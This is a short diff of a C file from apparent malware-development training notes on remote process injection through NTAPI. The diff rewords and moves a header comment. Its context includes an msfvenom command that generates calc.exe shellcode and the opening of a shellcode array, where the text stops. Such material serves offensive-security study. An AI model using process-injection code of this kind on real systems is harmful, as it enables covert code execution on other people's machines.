@@ -1,11 +1,11 @@
+/*
+Maldev Academy Notes
+Remote Process Injection via NTAPI
+*/
+
 #include <windows.h>
 #include <stdio.h>
 #include "syscall-func.h"
-
-/*
-Maldev Academy Notes
-Remote Process Injection via syscall
-*/
 
 // Payload - msfvenom -p windows/x64/exec CMD=calc.exe -f c 
 unsigned char shellcode[] = {
